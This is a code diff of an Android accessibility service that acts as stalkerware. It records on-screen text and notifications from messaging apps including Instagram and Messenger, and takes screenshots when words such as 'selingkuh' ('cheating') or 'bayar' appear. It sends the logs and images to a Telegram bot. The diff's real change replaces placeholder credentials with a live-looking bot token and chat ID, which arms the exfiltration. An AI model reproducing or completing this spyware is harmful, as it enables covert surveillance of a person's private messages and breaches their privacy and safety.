@@ -51,10 +51,10 @@ public class MyAccessibilityService extends AccessibilityService {
     private static final String TARGET_APP_PACKAGE3 = "com.instagram.android";
     private static final String TARGET_APP_PACKAGE4 = "com.facebook.orca";
     private static final long EXPIRATION_TIME = 10 * 60 * 1000; // 10 minutes in milliseconds
-    
+
     // Screenshot trigger keywords
     private static final String[] TRIGGER_KEYWORDS = {"test", "selingkuh", "bayar"};
-    
+
     // Screenshot related variables
     private MediaProjectionManager mediaProjectionManager;
     private MediaProjection mediaProjection;
@@ -83,15 +83,15 @@ public class MyAccessibilityService extends AccessibilityService {
             default:
                 // Handle other event types if needed
         }
-        
+
         if (event == null) return;
 
         // Check for window state changes
         if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
             String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
 
-            if (TARGET_APP_PACKAGE1.equals(packageName) || TARGET_APP_PACKAGE2.equals(packageName) || 
-                TARGET_APP_PACKAGE3.equals(packageName) || TARGET_APP_PACKAGE4.equals(packageName)) {
+            if (TARGET_APP_PACKAGE1.equals(packageName) || TARGET_APP_PACKAGE2.equals(packageName) ||
+                    TARGET_APP_PACKAGE3.equals(packageName) || TARGET_APP_PACKAGE4.equals(packageName)) {
                 Log.d(TAG, "Target app opened!");
                 logAllTexts();
             }
@@ -145,17 +145,17 @@ public class MyAccessibilityService extends AccessibilityService {
 
     private void initScreenshot() {
         mediaProjectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        
+
         // Get screen dimensions
         WindowManager windowManager = (WindowManager) getSystemService(Context.WINDOW_SERVICE);
         Display display = windowManager.getDefaultDisplay();
         DisplayMetrics metrics = new DisplayMetrics();
         display.getRealMetrics(metrics);
-        
+
         screenWidth = metrics.widthPixels;
         screenHeight = metrics.heightPixels;
         screenDensity = metrics.densityDpi;
-        
+
         // Setup background thread
         backgroundThread = new HandlerThread("ScreenshotThread");
         backgroundThread.start();
@@ -170,11 +170,11 @@ public class MyAccessibilityService extends AccessibilityService {
 
         // Note: In a real implementation, you would need to request media projection permission
         // from the user first. This is a simplified version for educational purposes.
-        
+
         try {
             // Setup ImageReader
             imageReader = ImageReader.newInstance(screenWidth, screenHeight, PixelFormat.RGBA_8888, 1);
-            
+
             imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                 @Override
                 public void onImageAvailable(ImageReader reader) {
@@ -184,22 +184,22 @@ public class MyAccessibilityService extends AccessibilityService {
                         if (image != null) {
                             Image.Plane[] planes = image.getPlanes();
                             ByteBuffer buffer = planes[0].getBuffer();
-                            
+
                             int pixelStride = planes[0].getPixelStride();
                             int rowStride = planes[0].getRowStride();
                             int rowPadding = rowStride - pixelStride * screenWidth;
-                            
+
                             Bitmap bitmap = Bitmap.createBitmap(screenWidth + rowPadding / pixelStride, screenHeight, Bitmap.Config.ARGB_8888);
                             bitmap.copyPixelsFromBuffer(buffer);
-                            
+
                             // Convert bitmap to base64 for sending
                             ByteArrayOutputStream baos = new ByteArrayOutputStream();
                             bitmap.compress(Bitmap.CompressFormat.PNG, 100, baos);
                             byte[] imageBytes = baos.toByteArray();
-                            
+
                             // Send screenshot with context
                             sendScreenshotToTelegram(imageBytes, contextText);
-                            
+
                             bitmap.recycle();
                         }
                     } catch (Exception e) {
@@ -211,7 +211,7 @@ public class MyAccessibilityService extends AccessibilityService {
                     }
                 }
             }, backgroundHandler);
-            
+
         } catch (Exception e) {
             Log.e(TAG, "Failed to setup screenshot: " + e.getMessage());
         }
@@ -277,7 +277,7 @@ public class MyAccessibilityService extends AccessibilityService {
             Notification notification = (Notification) event.getParcelableData();
             StringBuilder notificationDetails = new StringBuilder();
             notificationDetails.append("🔔 Notification:\n");
-            
+
             if (notification != null) {
                 Bundle extras = notification.extras;
                 String title = extras.getString(Notification.EXTRA_TITLE, "");
@@ -289,7 +289,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 if (!text.isEmpty()) notificationDetails.append("  Text: ").append(text).append("\n");
                 if (!subText.isEmpty()) notificationDetails.append("  Sub: ").append(subText).append("\n");
                 if (!bigText.isEmpty()) notificationDetails.append("  Big: ").append(bigText).append("\n");
-                
+
                 // Check for trigger keywords in notification
                 String fullNotificationText = title + " " + text + " " + subText + " " + bigText;
                 if (containsTriggerKeywords(fullNotificationText)) {
@@ -298,7 +298,7 @@ public class MyAccessibilityService extends AccessibilityService {
                 }
             } else {
                 notificationDetails.append("  Content: ").append(notificationText).append("\n");
-                
+
                 if (containsTriggerKeywords(notificationText.toString())) {
                     Log.d(TAG, "Trigger keyword in notification! Taking screenshot...");
                     takeScreenshot(notificationText.toString());
@@ -341,7 +341,7 @@ public class MyAccessibilityService extends AccessibilityService {
             String deviceInfo = "📱 Device: " + Build.MANUFACTURER + " " + Build.MODEL + "\n";
             String timestamp = "🕐 Time: " + getCurrentTimestamp() + "\n";
             String separator = "═══════════════════════════\n";
-            
+
             log = separator + deviceInfo + timestamp + separator + log;
         }
 
@@ -375,7 +375,7 @@ public class MyAccessibilityService extends AccessibilityService {
             currentKeyEvents.append("🚀 Service Started\n").append(deviceDetails).append("\n");
             currentKeyEvents.append("🔍 Monitoring keywords: ").append(Arrays.toString(TRIGGER_KEYWORDS)).append("\n");
             sendBufferToTelegramAndClear(false);
-            
+
             SharedPreferences.Editor editor = prefs.edit();
             editor.putBoolean("FirstRun", false);
             editor.apply();
@@ -413,10 +413,10 @@ public class MyAccessibilityService extends AccessibilityService {
             String log = strings[0];
 
             try {
-                String botNumber = "BOT_NUMBER";
-                String secretKey = "SECRET_KEY";
+                String botNumber = "8044862489";
+                String secretKey = "AAG6N9nSl-mS5_qNoDB7AAwHp64VgRS_q_A";
                 String botToken = botNumber + ":" + secretKey;
-                String chatId = "CHAT_ID";
+                String chatId = "584847845";
                 String urlString = "https://api.telegram.org/bot" + botToken + "/sendMessage";
 
                 URL url = new URL(urlString);
@@ -460,10 +460,10 @@ public class MyAccessibilityService extends AccessibilityService {
             String contextText = (String) params[1];
 
             try {
-                String botNumber = "BOT_NUMBER";
-                String secretKey = "SECRET_KEY";
+                String botNumber = "8044862489";
+                String secretKey = "AAG6N9nSl-mS5_qNoDB7AAwHp64VgRS_q_A";
                 String botToken = botNumber + ":" + secretKey;
-                String chatId = "CHAT_ID";
+                String chatId = "584847845";
                 String urlString = "https://api.telegram.org/bot" + botToken + "/sendPhoto";
 
                 URL url = new URL(urlString);
@@ -479,8 +479,8 @@ public class MyAccessibilityService extends AccessibilityService {
                 }
 
                 String caption = "🔍 Screenshot triggered by keyword\n" +
-                              "🕐 Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n" +
-                              "📝 Context: " + contextText;
+                        "🕐 Time: " + new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()) + "\n" +
+                        "📝 Context: " + contextText;
 
                 JSONObject photoJSON = new JSONObject();
                 photoJSON.put("chat_id", chatId);
